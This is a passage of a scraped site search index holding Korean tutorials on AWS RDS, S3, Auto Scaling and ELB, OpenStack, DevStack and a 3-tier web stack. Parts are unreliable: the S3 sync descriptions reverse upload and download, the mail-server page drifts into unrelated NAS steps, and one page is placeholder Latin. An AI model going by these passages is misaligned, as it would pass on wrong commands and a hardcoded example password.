안전하게 관리가 가능합니다. AWS RDS는 중요한 개념이므로, RDS에 대한 개념이 학습이 필요한 들은 AWS RDS를 참고해주세요.    AWS RDS 생성      먼저, RDS의 생성을 위해 AWS의 접속하여 RDS를 검색 후 클릭합니다.      데이터베이스 생성 -\u0026gt; 데이터베이스 생성을 클릭합니다.      여러 DB와 옵션을 사용할 수 있지만, 여기에서는 프리 티어 내에서 사용할 수 있도록 성정하도록 하겠습니다. 프리 티어의 체크 및 MySQL을 선택합니다.      RDS도 원리는 인스턴스에 DB가 설치된 것으로, CPU와 RAM이 존재합니다. DB 엔진 버전 : DB의 버전을 설정하는 옵션입니다. DB 인스턴스 클래스 : DB 인스턴스의 타입을 설정하는 옵션입니다. 다중 AZ 배포 : 서로 다른 가용영역에 배포하는 옵션 입니다. 스토리지 자동 조정 : DB의 용량이 할당된 용량을 초과하면, 자동적으로 스토리지의 량이 증가하게 할 수 있는 옵션입니다. DB 인스턴스 식별자 : RDS의 이름입니다. 마스터 사용자 이름 : RDS 접속 시 사용할 사용자입니다.      네트워크 및 보안 설정에서는 RDS가 생성될 VPC와 Subnet 및 퍼블릭 엑세스가 가능하게 할지 결정할 수 있습니다. 보안그룹은 기존 보안그룹을 사용해도 되지만, 여기서는 새로운 VPC 보안 그룹을 만들어 사용하겠습니다.      RDS 내의 DB의 이름 및 포트, 파라미터 그룹 등을 설정합니다.      RDS를 자동 백업 및 스냅샷에 대한 설정입니다. 읽기 복제본을 위해서는 설정이 되어있어야 합니다.      모니터링 서비스 및 발신 로그 유형을 선택합니다. 여기서는 선택하지 않습니다.      RDS의 유지관리 및 삭제방지의 대한 설정입니다. RDS는 자동적으로 업데이트가 가능하고, 삭제 방지의 대한 설정이 가능합니다.      RDS의 생성이 완료되면 RDS \u0026gt; 데이터베이스에서 확인이 가능합니다.      RDS에 접속을 위해 생성한 RDS를 클릭하여 연결\u0026amp;보인 \u0026gt; 보안그룹을 클릭하여 수정하겠습니다.      인 바운드 규칙을 그림과 같이 수정합니다. 혹은 접속한 동일 VPC의 서브넷의 IP대역으로 수정도 가능합니다.      이제 다시 RDS에 돌아와 파라미터 그룹을 생성 하겠습니다. 파라미터 그룹을 생성하는 그본 파라미터 그룹을 사용하면 한글 사용시 에러가 발생하기 때문입니다. 그림과 같이 파라미터 그룹 \u0026gt; 파라미터 그룹 생성을 클릭합니다.      파라미터 그룹을 생성합니다.      파라미터 그룹을 수정하기 위해 생성한 파라미터 그룹을 클릭 후, 편집을 진행합니다.      charcter을 검색 후, character-set-client-handshake, skip-character-set-client-handshake, validate_password_special_char_count를 제외한 모든 값을 utf8로 설정합니다. charcter과 동일하게 collation을 검색 후, collation_connection, collation_server의 값을 utf8_unicode-ci로 설정합니다.      파라미터 그룹이 생성되면, 다시 데이터베이스로 돌아와 수정을 클릭합니다.      데이터베이스 옵션에서 DB 파라미터 그룹을 생성한 파라미터 그룹으로 수정합니다.      즉시 적용을 선택합니다.      RDS가 수정중임을 확인할 수 있습니다.      수정이 완료되면, 생성한 RDS를 클릭하여 연결\u0026amp;보안에서 엔드포인트를 확인합니다.     $ apt -y install mysql-client\r 이후 동일한 VPC 내에서 인스턴스를 하나 생성해 mysql-client를 설치 후 접속을 진행합니다. mysql -u [ 생성시의 마스터 이름 ] -p -h [ RDS의 엔드포인트 ]를 통해 접속을 진행합니다. RDS 생성시에 설정한 DB로 접속이 가능함을 확인할 수 있습니다.   $ mysql\u0026gt; show variables like \u0026#39;c%\u0026#39;;\r# Variable 확인\r$ mysql\u0026gt; set session [ Variable_name ]=[ 변경 값 ]\r# Variable 변경\r  위 처럼 직접변경 또한 가능합니다.    이것으로 기본적인 RDS에 대한 생성을 마치겠습니다. #  "});index.add({'id':78,'href':'/docs/cloudcomputing/openstack/heat/','title':"Heat",'content':"오케스트레이션 서비스 : Heat   Heat   Heat는 탬블릿과 Stack을 사용하여 자동으로 인스턴스의 리소스를 추가하거나 줄이는 서비스 오케스트레이션은 자원 관리, 배치, 정렬을 자동화하는 것 오케스트레이션은 인스턴스 생성에 대한 일련의 과정을 자동화해서 인프라를 쉽게 배포할 수 있도록 하는 탬플릿 기반 엔진 오케스트레이션에서 사용되는 템플릿 언어는 인프라, 서비스, 응용프로그램, 프로비저닝, 자동화 컴퓨팅, 스토리지, 네트워킹, 자동 스케일링 등에 사용 가능   Heat의 논리 아키텍처      구성요소 역할     heat-api RPC heat 엔진에 전송해서 요청된 API를 처리한 REST API를 제공   heat-api-cfn AWS CloudFormation과 호환되는 AWS 타입의 Query API를 제공   heat-engine 템플릿을 생성하고, Consumer(API를 사용하려고 접근하는 애플리케이션이나 서비스)를 다시 이벤트로 제공하는 오케스트레이션의 주 작업을 수행   queue 각 서비스들이 통신을 하기 위한 서비스      "});index.add({'id':79,'href':'/docs/network/mail/mail-server/','title':"Mail Server",'content':"Mail 서버 생성   단계  SSL 보안 인증서 발급받기  도메인 주소   메일서버 설치   Ubuntu 18.04\n   SSL 보안 인증서 발급받기  1. 도메인 주소 설정  SSL 보안 인증서를 사용하기 위해서는 http://도메인으로 해당 사이트에 접근이 가능해아합니다. 이미 도메인 주소가 있으신 분은 그것을 사용하고, 없으신 분은 Link에서 무료 도메인을 사용하시면 됩니다.   2. SSL  무료 SSL을 생성합니다.  $ sudo apt-get install -y postfix\r# postfix 설치\r   VMware에 NAS 설치   Vmware에서 Custom으로 Virtual Machine을 설치합니다.      14 혹은 15 버전을 선택 후 iso파일을 선택합니다. 파일이 없을시 Link에서 다운로드 합니다..      운영체제는 Linux에서 2.6.x Kernel 64-bit를 선택합니다.      Virtual Machine의 이름을 지정합니다.      코어 할당량을 지정합니다. ( 여기서는 빠른 설치를 위해 2/2개를 할당하였습니다. )      RAM을 할당을 지정합니다. ( 여기서는 빠른 설치를 위해 4G을 할당하였습니다.      접속의 편리를 위해 Nat로 선택합니다.      LSILogic으르 선택합니다.      SATA를 선택합니다.    Use an existing virtual disk를 선택 후, synoboot.vmdk를 임포트 시킵니다.      설정 창이 뜨면 기존 포맷을 유지시킵니다.      NAS를 실행시키기 전에 하드를 추가시킵니다. ( 여기서는 20G 하나만 추가시키겠습니다. )      실행 후, 1분이 경과하면 find.synology.com에 접속합니다.                                                                "});index.add({'id':80,'href':'/docs/network/%EC%A0%95%EB%A6%AC%EC%A0%84/3tier/','title':"3 Tier",'content':"Loacal 3Tier 구현    OS, 구현 프로그램  Ubuntu18.04 Apache2 Tomcat8 Mysql5.8 GNS3   IP 대역  10.10.10.0/24 Public 20.20.20.0/24 Private 30.30.30.0/24 Private2  Public 대역 10.10.10.10 Apache1 10.10.10.11 Apache2  Private 대역 20.20.20.20 Tomcat1 20.20.20.21 Tomcat2  Public 대역 30.30.30.30 Mysql1 30.30.30.30 Mysql2     sudo vi /etc/netplan/50-cloud-init.yaml\rnetwork:\rversion: 2\rethernets:\rens33:\rdhcp6: no\raddresses:\r- [ IP addresses ]\rgateway4: [ gateway ]\rnameservers:\raddresses: [ [nameserver] ]\r$ sudo netplan apply\r$ hostname -l\r아키텍처 사진\n하단 부터 설치를 진행합니다.\n   Mysql 설치   30.30.30.30 Mysql1  $ sudo apt-get install -y mysql-server\r# mysql 설치\r$ sudo mysql_secure_installation\r# mysql pw 설정\r$ systemctl enable mysql\r# mysql 자동실행 등록\r $ mysql\u0026gt; create database web; $ mysql\u0026gt; create table web.people(name varchar(100), age int);\r$ mysql\u0026gt; insert into web.people values(\u0026#39;kim\u0026#39;,20);\r$ mysql\u0026gt; insert into web.people values(\u0026#39;Lee\u0026#39;,10);\r$ mysql\u0026gt; insert into web.people values(\u0026#39;Hong\u0026#39;,17);\r$ mysql\u0026gt; select * from web.people;\r# 확인\r 연동 확인을 위한 데이터 삽입   $ mysql\u0026gt; create user \u0026#39;web\u0026#39;@\u0026#39;%\u0026#39; identified by \u0026#39;Dkagh1234.\u0026#39;;\r$ mysql\u0026gt; grant all privileges on web.* to \u0026#39;web\u0026#39;@\u0026#39;%\u0026#39;;\r  원격 접속을 위한 유저 생성   $ ufw allow 3306\r 방화벽 포트 등록   $ vi /etc/mysql/mysql.conf.d/mysqld.cnf\rbind-address = 127.0.0.1 -\u0026gt; tomcat IP\r mysql 접속 허용 IP 설정     Tomcat8 설치  20.20.20.20 tomcat\n$ apt-get install -y lrzsz\r# JAVA 간편 다운로드를 위한 Irzsz 설치\r$ apt-get install -y openjdk-8-jre\r$ apt-get install -y openjdk-8-jdk\r JAVA 설치   $ which javac\r$ readlink -f /usr/bin/javac\r# 자바 위치 확인\r$ vi /etc/profile\rexport JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64\rexport PATH=$JAVA_HOME/bin/:$PATH\rexport CLASS_PATH=$JAVA_HOME/lib/:$CLASS_PATH\r$ source /etc/profile\r$ echo $JAVA_HOME\r$ $JAVA_HOME/bin/javac -version\r 환경변수 등록 및 확인   $ apt-get install -y tomcat8\r$ /usr/share/tomcat8/bin/version.sh\r# 톰캣 버전 확인\r$ ufw allow 8080/tcp\r$ ufw allow 8009/tcp\r# 톰캣 방화벽 포트 설정 ( 8080은 추후에 삭제 및 8009는 각 설정 포트에 맞게 변경 )\r$ systemctl enable tomcat8\r# tomcat8 자동시작 등록\r 톰캣 설치   $ apt-get install -y libapache2-mod-jk # 연동 모듈 설치\r$ vi /etc/tomcat8/server.xml\r\u0026lt;Connector port=\u0026#34;8009\u0026#34; protocol=\u0026#34;AJP/1.3\u0026#34; redirectPort=\u0026#34;8443\u0026#34; /\u0026gt;\r# 주석 헤제 및 포트 변경\r 톰캣 연동 모듈 설치 및 설정   wget [ 다운로드 링크 ]\r mysql-connector 다운로드 및 적용   $ vi /var/lib/tomcat8/webapps/ROOT/index.jsp\r\u0026lt;%@page import=\u0026#34;java.sql.*\u0026#34;%\u0026gt;\r\u0026lt;%@ page language=\u0026#34;java\u0026#34; contentType=\u0026#34;text/html; charset=UTF-8\u0026#34;\rpageEncoding=\u0026#34;UTF-8\u0026#34;%\u0026gt;\r\u0026lt;!DOCTYPE html PUBLIC \u0026#34;-//W3C//DTD HTML 4.01 Transitional//EN\u0026#34; \u0026#34;http://www.w3.org/TR/html4/loose.dtd\u0026#34;\u0026gt;\r\u0026lt;html\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;meta http-equiv=\u0026#34;Content-Type\u0026#34; content=\u0026#34;text/html; charset=UTF-8\u0026#34;\u0026gt;\r\u0026lt;title\u0026gt;Insert title here\u0026lt;/title\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;%\rConnection conn = null;\rResultSet rs = null;\rString url = \u0026#34;jdbc:mysql://[ DB IP ]:3306/[ DB name ]?serverTimezone=UTC\u0026#34;;\rString id = \u0026#34;[ 원격 user ]\u0026#34;;\rString pwd = \u0026#34;[ 원격 pw ]\u0026#34;;\rtry {\rClass.forName(\u0026#34;com.mysql.jdbc.Driver\u0026#34;);\rconn = DriverManager.getConnection(url, id, pwd);\rStatement stmt = conn.createStatement();\rString sql = \u0026#34;SELECT name, age FROM web.people\u0026#34;;\rrs = stmt.executeQuery(sql);\rwhile(rs.next()) {\rout.println(rs.getString(\u0026#34;name\u0026#34;));\rout.println(rs.getString(\u0026#34;age\u0026#34;));\r}\rconn.close();\r} catch (Exception e) {\re.printStackTrace();\r}\t%\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt;\r DB 연동을 위한 jsp 파일 생성      Apache2 설치  10.10.10.10 Apache\n$ apt-get -y install apache2\r# apache2 설치\r$ systemctl enable apache2\r# apache2 자동실행 등록\r$ ufw allow 80/tcp\r# 방화벽 등록\r$ apt-get install -y libapache2-mod-jk\r# tomcat 연동 모듈 설치\r Apache2 설치 및 tomcat 연동 모듈 설치   $ vi /etc/apache2/workers.properties\rworkers.tomcat_home=/usr/share/tomcat8\rworkers.java_home=/usr/lib/jvm/java-8-openjdk-amd64\rworker.list=tomcat8\rworker.tomcat8.port = 8009\rworker.tomcat8.host = tomcat IP\rworker.tomcat8.type = ajp13\rworker.tomcat8.lbfactor = 1\r tomcat 워커 파일 등록   $ vi /etc/apache2/mods-available/jk.conf\rJkWorkersFile /etc/libapache2-mod-jk/workers.properties\r--\u0026gt; JkWorkersFile /etc/apache2/workers.properties\r jk.conf 파일 수정   $ vi /etc/apache2/sites-available/000-default.conf\rDocumentRoot /var/www/html\r--\u0026gt; DocumentRoot /var/lib/tomcat8/webapps/ROOT\rJkMount /* tomcat8 # 추가\rsystemctl restart apache2\r 접근 디렉토리 수정    "});index.add({'id':81,'href':'/docs/cloudcomputing/awstraining/3tier/','title':"AWS 3Tier 구현",'content':"****    ****          예제 1. 다음의 인스턴스를 생성해보세요.  \r예제 1. 답안\r↕\r\r 사용자 계정을 생성할 시, 엑세스 유형에서 프로그래밍 방식 엑세스만을 선택합니다. 정책에서 admin의 권한을 선택 후 생성합니다. \r\r\r\r "});index.add({'id':82,'href':'/docs/cloudcomputing/%EC%A0%95%EB%A6%AC%EC%A0%84/aws_as/','title':"AWS AutoScaling",'content':"Auto Scaling  Auto Scaling  EC2 인스턴스를 자동으로 시작하거나 종료하여 애플리케이션 로드를 처리하기에 적절한 수의 EC를 유지할 수 있도록 하는 서비스 사용자가 정의하는 조건에 따라 EC2 개수를 자동으로 확장 또는 축소가 가능 모니터링을 통해 비정상 인스턴스를 탐지하고 교체할 수 있음 수요가 급증할 경우 EC2 수를 자동으로 늘려 성능을 유지하고 수요가 적을 경우 수를 줄여 비용을 절감 ELB의 대상그룹을 Auto Scaling Group( ASG )에 포함시켜 자동생성된 EC2로 하여금 트래픽 부하분산을 하도록 설정가능 수요 변화가 예측 나응한 경우 예약된 일정을 통해 정해싲 시간에 늘리거나 줄이도록 설정이 가능 ASG 내 손상된 인스턴스가 발견될 경우, Auto Scaling은 이를 자동으로 종료하고 새로운 인스턴스로 교체  ELB를 사용하는 경우, ELB가 손상된 인스턴스를 트래픽 요청 대상에서 분리시킨 후, Auto Scaling이 이를 새로운 인스턴스로 교체   비정상 서버 탐지 후 Auto Scaling이 새로운 인스턴스를 In Service 상태를 만들기까지 5분 이내 소요   \rAWS Auto Scaling 그룹\r...\r\rAWS Auto Scaling 그룹   AWS Auto Scaling 그룹은 AWS에서 제공하는 자동 다중 서버 서비스를 의미한다. 즉, Auto Scaling 그룹은 같은 사양, 같은 환경, 같은 코드를 가지고 있는 같은 EC2 인스턴스들의 묶음을 의미하며, Auto Scaling은 인스턴스의 수를 자동으로 늘리고, 자동으로 줄일 수 있는 서비스를 의미한다.    AWS Auto Scaling 그룹의 응용 예시   자원 사용량을 기준으로 한 자동 조정 시간을 기준으로한 자종 조정 \r\r\r\r   시작 구성( Launch Configuration )  Auto Scaling에서 새로운 인스턴스를 시작할 때 기반이 되는 구성 AMI ( Amazon Machine Image ), 인스턴스 유형, 보안그룹, 스토리지 등 EC2를 생성할 때와 마찬가지로 옵션을 구성할 수 있음 시작 구성은 한 번 생성시 수정이 불가능하며, 복사와 삭제만 가능 시작 구성을 변경하기 위해서는 기존의 시작구성을 새로운 시작 구성을 만드는 재료로 사용해야 함 하나의 ASG는 하나의 시작구성을 반드시 가짐    조정 정책 ( Scaling )  최소, 목표, 최대 크기를 설정할 수 있고, 별다른 정책이 없을 경우 목표 크기를 유지하려 함 또한 3가지 동적 정책 사용 가능 대상 추적 정채: ASG의 지표 평균값을 목표로 인스턴스 수를 조절  평균 CPU 사용률, 네트워크 입/ 출력, 로드밸런서 요청 수   단순 조정 정책: 지표의 임계치에 도달할 경우, 사용자가 정한 인스턴스 수를 늘리거나 감소시키는 정책 단계 조정 정책: 단순 조정 정책과 기본은 같지만, 지표 값에 따라 증감 수를 다르게 줄 수 있음 ( 즉 트리거가 여러 개 )    조정 휴지 ( Scaling Cooldown )  시작 구성을 이용한 ASG 생성 시점을 포함혀여 인스턴스 생성 혹은 제거 후, 지표의 임계값을 넘더라도 인스턴스를 생성하지 않고 기다리는 시간 300초   수명주기 후크 ( Life Cycle Hook )  Scale In / Out: In은 감소를, Out은 증가를 뜻함 지표의 임계값에 의해, Scale In/ Out 이 되고 나나 후 In service 상태에 돌입하기 전에 사용자가 정의한 작업을 수행하는 시간을 설정하는 기능 기본 3600초 즉 인스턴스 시작/ 종료시 사용자가 작업을 수행할 수 있음 이 시간동안 인스턴스에 설치 / 설정 등이 가능 가령, Cloudwatch를 사용하면 수명주기 작업이 발생시, Lamda 함수를 호출시키도록 설정 가능    Elastic Load Balancer ( ELB )   Elastic Load Balancer    AWS의 L4/ L7 로드밸런싱 ( 서버 부하분산 ) 서비스 외부 혹은 내부에서 들어오는 클라이언트의 요청을 ELB에 연결된 가용역에 있는 EC2로 고르게 나누어 전달하고 등록된 EC들을 상태 검사하는 서비스 외부/ 내부 트래픿은 ELB의 DNS 주소를 목적지로 하여 들어오며 이 트래픽을 받은 ELB는 가용영역에 등록된 EC2로 전달 보안그룹 적용 ELB 또한 VPC 내 존재하며 공인 IP 혹은 공인/ 사설 IP를 모두 가질 수 있음 인터넷 연결 option: 공인/ 사설 IP 생성 내부 option: 사설 IP 생성 기본적으로 Port를 이용하여 로드밸런싱 ‘리스너’를 거느리며 리스너 하나당 요청을 받아들이는 Port 하나 씩을 지정 ( 80 Prot 요청을 받아 들이는 리스너, 443 Port 요청을 받아들이는 리스터를 모두 등록 가능 ) 상태 검사에 성공한 EC2만이 요청 전달 대상이 되며 상태 검사에 실패한 Ec2는 요청 전달 대상에 제외 상태 검사에 성공한 EC2만이 요청 전달 대상이 되며 상태 검사에 실패한 EC2는 요청 전달 대상에 제외 SSL 인증서를 등록하여 HTTPS 암호화/ 복호화 통신을 대신하는 ‘SSL OFFload’ 가능 ELB는 세 가지 로드밸런서로 구성 ( Application Load Balancer, Network Load Balancer, Classic Load Balancer )   Target Group ( 대상 그룹 )  EBL에 등록된 EC2 인스턴스들의 그룹 대상 그룹에 등록된 EC2, EC2 상태, 상태 검사 방법 등을 정의 상태 검사 방법에는 HTTP, HTTPS, TCP 등이 있음 방법뿐만 아니라, 상태 검사에 필요한 시간도 정의 가능 ALB와 NLB는 대상그룹을 지정하며, CLB는 로드밸런서에 직접 등록   각 항목에 대한 설명  경로 : 인스턴스가 정상인지 확인하기 위해 호출할 URL 주소로, 인스턴스 내 해당주소로 응답을 줄 수 있게 구성되어야 한다. 정상 임계 값 : 연속으로 몇 번 정상 응답을 해야만 정상 상태로 볼 것인지 지정하는 항목 비정상 임계 값 : 연속으로 몇 번 비정상 응답을 해야만 정상 상태로 볼 것인지를 지정하는 항목 간격 : 몇 초 간격으로 인스턴스의 상태를 물어볼지 지정하는 항목 성공 코드 : 어떤 HTTP 응답 코드를 줬을 경우 정상 상태로 판달할 것인지를 지정하는 항목   Elastic Load Balancer의 종류   Network Load Balancer ( NLB )    AWS NLB는 AWS Load Balancer에 Elastic IP(고정)을 부여할 수 있는 현재까진 유일한 Load Balancer 이다.\n  TCP 레이어까지만 지원한다. 따라서 http cookie 방식의 sticky는 지원하지 않으며, tcp 세션을 350초 유지한다고 한다.\n  NLB의 장점은 클라이언트의 요청에 대해서 낮은 대기 시간으로 높은 처리가 가능하다.\n  따라서 기존 ELB 사용 시에는 짧은 시간 내 스파크성 트래픽 발생에 대한 대응이 어려웠으나 NLB를 사용함으로 ELB의 단점을 해소할 수 있을 것이다.\n  또한 이벤트 등으로 사이트의 유입이 늘어날 것을 대비해 ELB의 Prewarm을 준비하곤 했으나, NLB를 사용함으로 ELB의 단점을 해소할 수 있을 것이다.\n  NLB와 묶일 수 있는 대상은 아래와 같다.\n VPC 내의 EC2 인스턴스(Instance)  AWS 다른 대역의 리소스 혹은 VPN, DX로 터널링 된 Private IP 대역 (10.0.0.0/8, 100.64.0.0/10, 172.16.0.0/12, 192.168.0.0/16만 가능하다.)      client ip 와 serverip로 진입하는 트래픽은 LB를 통하고 나가는 트래픽은 Client 와 직접통신\n  security group 이 적용되지 않아 SG에서 보안가능\n  access 제한 가능\n  A record 사용가능\n  OSI4 계층의 tcp트래픽에 적합\n   Application Load Balancer ( ALB )   L7 로드밸런서 HTTL/ HTTPS Header 정보를 기반으로 요청을 전달하는 로드밸런서 ( 즉 리스너가 HTTP/ HTTPS를 전문적으로 다름 ) 요청에 따라 고정 페이지를 반환하거나 다른 경로로 리다이렉트 HTTP Header / HTTP 요청 메서드 / Host Header / Source IP 등을 이용하여 요청 전달 가능 ( 동 그룹의 대상에게만 전달 가능 ) SSL 인증서르 이용하여 SSL Offload 지원 후술할 교차영역 로드밸런싱 지원 X-forwared-for를 지원하여 EC2로 하여금 클라이언트의 IP를 확인할 수 있도록 함 ALB가 소유한 공인 IP가 유동적으로 변경됨   Classic Load Balancer ( CLB )   L4/ L7을 모두 지원하는 ‘과거의’ 로드밸런서 EC2-Classic을 사용하는 경우 CLB를 사용하면 됨 TCP / HTTP/ HTTPS( S니 )을 지원 X-forwared-for 지원 교차영역 로드밸런싱 지원   Sticky Session  세션 고정 기능 하나의 요청이 특정 EC2로 들어와 세션이 생성되었다가 종료되고, 들어왔던 요청이 다시 들어올 경우 이미 연결되었던 특정 EC2로 전달하는 기능   교차영역 로드밸런싱  기본적으로 ELB는 대상그룹에 등록된 EC2별로 적절히 부하분산을 하는 것이 아닌 가용역역별로 비율을 나눔 ( 가용영역의 EC2의 부하가 심해짐 ) 이를 방지하기 위해 교차영역 로드밸런싱을 활성화하면 가용역영익 아닌 EC2 개수를 기반으로 계산하여 전달하므로 부하가 고르게 나누어짐   X-Forwared-for  Client의 IP를 담고 있는 HTTP Header EC2 내 서비스가 Client의 IP를 확인할 필요가 있는 경우 ELB는 HTTP Header에 X-Forwared-for를 장착하여 전달   X-Forwared-for  AutoSacling과 Elb를 함꼐 사용시 필요에 따라 EC2가 없어질 경우, 해당 EC2에 요청이 들어와있으면 사용중인 커넷션( 세션 )이 피해를 볼 수 있음 삭제되기 직전에 사용중인 커넥션(세션)이 작업을 마칠 때까지 기다리는 기능   "});index.add({'id':83,'href':'/docs/cloudcomputing/openstacktraining/devstack/','title':"DevStack",'content':" DevStack Stein 설치  DevStack   Devbian 계열 ( ex : Ubuntu )의 OpenStack 자동화 설치 툴   DevStack 설치   Update Ubuntu System  $ sudo apt -y update\r$ sudo apt -y upgrade\r$ sudo apt -y dist-upgrade\r# Ubuntu의 시스템 및 패키지를 업데이트 합니다.\r$ sudo init 6\r# 시스템을 재시작합니다.\r    Add Stack User  $ sudo useradd -s /bin/bash -d /opt/stack -m stack\r# devstack 설치를 위해 stack 유저를 생성합니다.\r$ echo \u0026#34;stack ALL=(ALL) NOPASSWD: ALL\u0026#34; | sudo tee /etc/sudoers.d/stack\r# 암호 없이 접근할 권한을 부여합니다.\r    Download DevStack loacl.conf 파일의 추가적인 설정은 DevStack을 참조해주세요.  $ su - stack\r$ sudo apt -y install git\r$ git clone https://git.openstack.org/openstack-dev/devstack\r# stack user로 진입하여, devstack을 다운받습니다.\r$ vi local.conf\r[[local|localrc]]\rADMIN_PASSWORD=[ PW ]\rDATABASE_PASSWORD=$ADMIN_PASSWORD\rRABBIT_PASSWORD=$ADMIN_PASSWORD\rSERVICE_PASSWORD=$ADMIN_PASSWORD\rHOST_IP=[ 현재 호스트의 IP ]\r# 설치를 위한 설정 파일을 생성합니다.\r# PW, IP에는 사용자가 원하는 PW, 설치 호스트 네트워크의 IP를 기입합니다.\r    Start OpenStack Deployment On Ubuntu 18.04 with DevStack  $ cd devstack\r./stack.sh\r    Access OpenStack Dashboard  http://[ HOST IP ]/dashboard로 접속합니다.\rUser Name = admin\rPassword = local.conf의 PW\r  "});index.add({'id':84,'href':'/docs/network/','title':"Network",'content':"Collapsed Level of Menu Cognita laeva illo fracta Lorem markdownum pavent auras, surgit nunc cingentibus libet Laomedonque que est. Pastor An arbor filia foedat, ne fugit aliter, per. Helicona illas et callida neptem est Oresitrophos caput, dentibus est venit. Tenet reddite famuli praesentem fortibus, quaeque vis foret si frondes gelidos gravidae circumtulit inpulit armenta nativum.\n Te at cruciabere vides rubentis manebo Maturuit in praetemptat ruborem ignara postquam habitasse Subitarum supplevit quoque fontesque venabula spretis modo Montis tot est mali quasque gravis Quinquennem domus arsit ipse Pellem turis pugnabant locavit  "});index.add({'id':85,'href':'/docs/cloudcomputing/openstack/','title':"OpenStack",'content':"OpenStack  Openstack keystone Glance Nova Swift Neutron Cinder Horizon Heat Ceilometer Sahara Trove Ironic    목차 1. 시스템 및 네트워크 구성\n2. Openstack 기본 패키지 구성\n3. Keystone ( 인증 서비스 ) 구성\n4. Glance ( 이미지 서비스 ) 구성\n5. Nova ( 컴퓨트 서비스 ) 구성\n6. Neutron ( 네트워크 서비스 ) 구성\n6-2. 테넌트 네트워크 환경 구축\n7. Horizon ( 대시보드 서비스 ) 구성\n8. Cinder ( 오브젝트 스토리지 및 블록 스토리지 구성 )\n8-2. LVM으로 블록 스토리지 백엔드 구성 8-3. LFS, LVM 기반 다중 스토리지 노드 구성\n9. Swift ( 오브젝트 스토리지 서비스 ) 구성\n10. SSL ( HTTPS ) 접속 가능한 오픈스택 대시보드 구성\n11. Openstack 대시보드 메인 로고 및 링크 변경 12. Neutron 기반 Service Functon Chaining ( SFC ) 기능 구성\n"});index.add({'id':86,'href':'/docs/cloudcomputing/awstraining/s3/','title':"AWS S3 생성",'content':"AWS S3 생성    이번 장에서는 S3를 생성해보도록 하겠습니다. S3 또한 중요한 개념이니, S3에 대한 학습을 원하는 분들은 AWS S3를 참조해주세요.    AWS S3 생성       AWS 서비스에서 S3를 검색합니다.      버킷 생성을 클릭합니다.      버킷의 이름과 리전을 선택합니다. 참고로 S3는 VPC에 영향을 받지 않습니다.      옵션을 선택합니다. 여기서는 기본 값으로 생성을 진행합니다.      S3에 대한 권한을 설정합니다. 기본적으로 차단되어 있는 것이 좋으며, 경우에 따라 설정 값을 변경합니다.      생성이 완료되면 버킷을 클릭합니다.      버킷을 클릭한 후, IMG 폴더를 생성합니다.      IMG 폴더로 진입하여 jpg 이미지 파일을 업로드 합니다.      이미지 파일을 선택하면 다운로드 링크, URL 링크를 확인할 수 있습니다. 여기에서는 URL 링크로 진입하여 보겠습니다.      링크로 진입하여도, 그림이 나타나지 않습니다. 이는 초기 버킷을 생성할 때, 퍼블릭 엑세스를 차단하였기 때문입니다.      이에 대한 수정을 위해 버킷에서 퍼블렉 엑세스 설정을 편집을 클릭합니다.      퍼블릭 엑세스 차단을 해제 후 저장합니다.      다시 파일을 선택하여 퍼블릭 설정을 클릭합니다.      URL로 접속하면 이미지가 나타납니다.         CLI S3 생성      $ aws s3 help\r$ aws s3api help\r s3에 대한 명령어를 출력합니다.     $ aws s3 mb s3://[ 버킷 이름 ]\r 버킷을 생성합니다.     $ aws s3 ls\r$ aws s3 ls s3://[ 버킷 이름 ]/path\r 버킷 및 폴더를 나열합니다.     $ aws s3 rb s3://[ 버킷 이름 ]\r$ aws s3 rb s3://[ 버킷 이름 ] --force\r 버킷을 삭제합니다.     $ aws s3 cp file.txt s3://my-bucket/ --grants [ 권한 ]\r        $ aws s3 sync [ local path ] s3://[ bucket path ]/[ path ]\r [ local path ]에서 [ bucket ]의 [ path ]에 모든 것을 Pull ( 다운로드 ) 합니다.     $ aws s3 sync s3://[ bucket path ]/[ path ] [ local path ]\r [ local path ]에서 [ bucket ]의 [ path ]에 모든 것을 Push ( 업로드 ) 합니다.     "});index.add({'id':87,'href':'/docs/cloudcomputing/openstacktraining/','title':"OpenStack Training",'content':"#\n"});index.add({'id':88,'href':'/docs/system/','title':"System",'content':"a\n"});index.add({'id':89,'href':'/docs/cloudcomputing/openstack/trove/','title':"Trove",'content':"데이터베이스 서비스 : Trove   Trove는 관계형 데이터베이스 기능을 활용 클라우드 사용자와 데이터 베이스 관리자는 필요에 따라 Trove를 통해 데이터베이스 인스턴스를 제공, 관리 서비스   Trove의 논리 아키텍처      구성요소 역할     python-troveclient 클라이언트에서 콘솔로 trove-api를 실행할 수 있게 지원   trove-api RESTful API 방식의 JSON을 지원, Trove인스턴스를 관리하고 프로비저닝   trove-taskmanager 인스턴스 프로비저닝을 지원, 라이프 사이클 관리 및 운영하는 작업을 수행   trove-conductor 호스트에서 실행되는 서비스로 호스트 정보를 업데이트 및 게스트 인스턴스 메시지를 수신   trove-guestagent 게스트 인스턴스 안에서 실행, 데이터 베이스 작업을 실행, 관리    "});index.add({'id':90,'href':'/docs/cloudcomputing/docker/','title':"Docker",'content':"Docker\n"});index.add({'id':91,'href':'/docs/system/linux/mount/','title':"Mount",'content':"Linux HD Mount   디스크의 구조 1. 물리적 구조\n 스핀들 : 디스크는 하나의 스핀들을 기준으로 여러 개의 플래터로 구성되어 있고 스핀들은 여러 개의 플랫터를 회전시키는 역할을 한다. 플래터 : 플래터는 마그네틱으로 코딩되어져 있고 연속으로 구성되어 있다. 헤더 : 회전중인 플래터에 데이터를 읽거나 쓰기 위해서는 엑세스 암에 부착된 헤더를 이용하여 엑세스 한다.   2. 논리적 구조\n 섹터 : 플래터의 가장 작은 단위, 일반적으로 1섹터의 크기는 512바이트 트랙 : 섹터가 모여 하나의 원을 구성 실린더 : 트랙의 스택 구조 파티션 : MBR의 파티션 테이블(64바이트)에 정보가 저장, 주 파티션 (16바이트, 4개까지 생성이 가능), 확장 파티션 생성이 가능 논리적 구조 크기 비교 : 섹터 \u0026lt; 트랙 \u0026lt; 실린더 \u0026lt; 실린더 그룹 or 파티션 \u0026lt; 디스크   3. 디스크의 종류\n IDE : 과거에 사용하던 방식, 하나의 채널에 여러 개의 장치를 연결 가능, 병렬 SATA : IDE방식에서는 늘어날 수 있는 기기의 한계가 존재하며, 속도도 느리기 때문에 이러한 문제를 해결한 방식, 직렬 SCSI : 서버용으로 사용되는 방식, 데이터 안전성에 집중 및 